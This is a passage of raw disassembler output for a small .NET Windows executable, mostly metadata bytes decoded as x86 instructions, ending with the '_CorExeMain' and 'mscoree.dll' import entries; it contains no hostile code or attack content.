  40cace:	00 02                	add    %al,(%edx)
  40cad0:	0e                   	push   %cs
  40cad1:	0e                   	push   %cs
  40cad2:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cad7:	1d 12 45 08 12       	sbb    $0x12084512,%eax
  40cadc:	45                   	inc    %ebp
  40cadd:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40cae2:	45                   	inc    %ebp
  40cae3:	05 20 00 11 81       	add    $0x81110020,%eax
  40cae8:	f1                   	int1
  40cae9:	09 00                	or     %eax,(%eax)
  40caeb:	02 02                	add    (%edx),%al
  40caed:	11 81 f1 11 81 f1    	adc    %eax,-0xe7eee0f(%ecx)
  40caf3:	07                   	pop    %es
  40caf4:	20 03                	and    %al,(%ebx)
  40caf6:	01 02                	add    %eax,(%edx)
  40caf8:	0e                   	push   %cs
  40caf9:	10 02                	adc    %al,(%edx)
  40cafb:	06                   	push   %es
  40cafc:	00 01                	add    %al,(%ecx)
  40cafe:	01 12                	add    %edx,(%edx)
  40cb00:	81 f9 06 07 02 12    	cmp    $0x12020706,%ecx
  40cb06:	81 85 02 08 20 03 01 	addl   $0x111c0e01,0x3200802(%ebp)
  40cb0d:	0e 1c 11 
  40cb10:	82 01 06             	addb   $0x6,(%ecx)
  40cb13:	07                   	pop    %es
  40cb14:	02 12                	add    (%edx),%dl
  40cb16:	81 85 0e 06 20 01 12 	addl   $0xe858112,0x120060e(%ebp)
  40cb1d:	81 85 0e 
  40cb20:	07                   	pop    %es
  40cb21:	20 02                	and    %al,(%edx)
  40cb23:	12 81 85 0e 02 12    	adc    0x12020e85(%ecx),%al
  40cb29:	07                   	pop    %es
  40cb2a:	06                   	push   %es
  40cb2b:	12 20                	adc    (%eax),%ah
  40cb2d:	0e                   	push   %cs
  40cb2e:	08 12                	or     %dl,(%edx)
  40cb30:	80 c9 15             	or     $0x15,%cl
  40cb33:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40cb39:	12 20                	adc    (%eax),%ah
  40cb3b:	10 10                	adc    %dl,(%eax)
  40cb3d:	01 01                	add    %eax,(%ecx)
  40cb3f:	15 12 31 01 1e       	adc    $0x1e013112,%eax
  40cb44:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40cb4a:	1e                   	push   %ds
  40cb4b:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cb4e:	01 12                	add    %edx,(%edx)
  40cb50:	20 05 20 01 02 13    	and    %al,0x13020120
  40cb56:	00 03                	add    %al,(%ebx)
  40cb58:	07                   	pop    %es
  40cb59:	01 1c 05 00 00 12 82 	add    %ebx,-0x7dee0000(,%eax,1)
  40cb60:	05 07 20 01 12       	add    $0x12012007,%eax
  40cb65:	82 09 1d             	orb    $0x1d,(%ecx)
  40cb68:	05 06 20 01 12       	add    $0x12012006,%eax
  40cb6d:	82 0d 0e 06 00 01 1c 	orb    $0x1c,0x100060e
  40cb74:	12 82 0d 08 00 01    	adc    0x100080d(%edx),%al
  40cb7a:	12 82 0d 11 82 15    	adc    0x1582110d(%edx),%al
  40cb80:	09 00                	or     %eax,(%eax)
  40cb82:	02 12                	add    (%edx),%dl
  40cb84:	82 19 11             	sbbb   $0x11,(%ecx)
  40cb87:	82 1d 0e 1c 00 05 12 	sbbb   $0x12,0x5001c0e
  40cb8e:	82 25 11 82 29 0e 15 	andb   $0x15,0xe298211
  40cb95:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cb9b:	0d 12 82 0d 15       	or     $0x150d8212,%eax
  40cba0:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cba6:	19 17                	sbb    %edx,(%edi)
  40cba8:	15 12 55 01 15       	adc    $0x15015512,%eax
  40cbad:	12 59 0a             	adc    0xa(%ecx),%bl
  40cbb0:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40cbb3:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40cbb9:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cbbe:	0e                   	push   %cs
  40cbbf:	0b 00                	or     (%eax),%eax
  40cbc1:	01 15 12 55 01 13    	add    %edx,0x13015512
  40cbc7:	00 12                	add    %dl,(%edx)
  40cbc9:	82 25 03 06 13 00 13 	andb   $0x13,0x130603
  40cbd0:	15 12 59 0a 12       	adc    $0x120a5912,%eax
  40cbd5:	5d                   	pop    %ebp
  40cbd6:	1c 12                	sbb    $0x12,%al
  40cbd8:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cbdd:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cbe2:	0e                   	push   %cs
  40cbe3:	17                   	pop    %ss
  40cbe4:	20 0a                	and    %cl,(%edx)
  40cbe6:	01 13                	add    %edx,(%ebx)
  40cbe8:	00 13                	add    %dl,(%ebx)
  40cbea:	01 13                	add    %edx,(%ebx)
  40cbec:	02 13                	add    (%ebx),%dl
  40cbee:	03 13                	add    (%ebx),%edx
  40cbf0:	04 13                	add    $0x13,%al
  40cbf2:	05 13 06 13 07       	add    $0x7130613,%eax
  40cbf7:	13 08                	adc    (%eax),%ecx
  40cbf9:	13 09                	adc    (%ecx),%ecx
  40cbfb:	05 07 01 12 82       	add    $0x82120107,%eax
  40cc00:	2d 07 20 03 01       	sub    $0x1032007,%eax
  40cc05:	0e                   	push   %cs
  40cc06:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cc0b:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cc11:	06                   	push   %es
  40cc12:	12 81 2d 12 82 39    	adc    0x3982122d(%ecx),%al
  40cc18:	12 82 3d 12 82 41    	adc    0x4182123d(%edx),%al
  40cc1e:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cc23:	20 01                	and    %al,(%ecx)
  40cc25:	01 11                	add    %edx,(%ecx)
  40cc27:	82 4d 06 20          	orb    $0x20,0x6(%ebp)
  40cc2b:	01 01                	add    %eax,(%ecx)
  40cc2d:	11 82 51 05 20 00    	adc    %eax,0x200551(%edx)
  40cc33:	12 82 55 0b 20 03    	adc    0x3200b55(%edx),%al
  40cc39:	01 12                	add    %edx,(%edx)
  40cc3b:	39 12                	cmp    %edx,(%edx)
  40cc3d:	82 55 11 82          	adcb   $0x82,0x11(%ebp)
  40cc41:	59                   	pop    %ecx
  40cc42:	08 20                	or     %ah,(%eax)
  40cc44:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cc4a:	08 1a                	or     %bl,(%edx)
  40cc4c:	07                   	pop    %es
  40cc4d:	0a 12                	or     (%edx),%dl
  40cc4f:	81 2d 12 82 39 1d 05 	subl   $0x41821205,0x1d398212
  40cc56:	12 82 41 
  40cc59:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cc5e:	82 3d 1d 05 1d 05 1d 	cmpb   $0x1d,0x51d051d
  40cc65:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cc6a:	12 81 71 08 12 81    	adc    -0x7eedf78f(%ecx),%al
  40cc70:	71 08                	jno    0x40cc7a
  40cc72:	08 04 07             	or     %al,(%edi,%eax,1)
  40cc75:	02 02                	add    (%edx),%al
  40cc77:	08 0e                	or     %cl,(%esi)
  40cc79:	07                   	pop    %es
  40cc7a:	06                   	push   %es
  40cc7b:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40cc80:	12 82 65 1d 05 08    	adc    0x8051d65(%edx),%al
  40cc86:	05 07 07 02 12       	add    $0x12020707,%eax
  40cc8b:	82 65 1d 05          	andb   $0x5,0x1d(%ebp)
  40cc8f:	0f 07                	sysret
  40cc91:	06                   	push   %es
  40cc92:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40cc98:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40cc9e:	05 08 20 02 01       	add    $0x1022008,%eax
  40cca3:	12 39                	adc    (%ecx),%bh
  40cca5:	11 82 6d 0c 07 04    	adc    %eax,0x4070c6d(%edx)
  40ccab:	12 81 2d 1d 05 12    	adc    0x12051d2d(%ecx),%al
  40ccb1:	82 69 1d 05          	subb   $0x5,0x1d(%ecx)
  40ccb5:	00 00                	add    %al,(%eax)
  40ccb7:	00 e0                	add    %ah,%al
  40ccb9:	cc                   	int3
	...
  40ccc2:	00 00                	add    %al,(%eax)
  40ccc4:	fe cc                	dec    %ah
  40ccc6:	00 00                	add    %al,(%eax)
  40ccc8:	00 20                	add    %ah,(%eax)
	...
  40ccde:	00 00                	add    %al,(%eax)
  40cce0:	f0 cc                	lock int3
	...
  40ccf2:	5f                   	pop    %edi
  40ccf3:	43                   	inc    %ebx
  40ccf4:	6f                   	outsl  %ds:(%esi),(%dx)
  40ccf5:	72 45                	jb     0x40cd3c
  40ccf7:	78 65                	js     0x40cd5e
  40ccf9:	4d                   	dec    %ebp
  40ccfa:	61                   	popa
  40ccfb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40cd02:	72 65                	jb     0x40cd69
  40cd04:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40cd08:	6c                   	insb   (%dx),%es:(%edi)
  40cd09:	00 00                	add    %al,(%eax)
  40cd0b:	00 00                	add    %al,(%eax)
  40cd0d:	00 ff                	add    %bh,%bh
  40cd0f:	25 00 20 40 00       	and    $0x402000,%eax
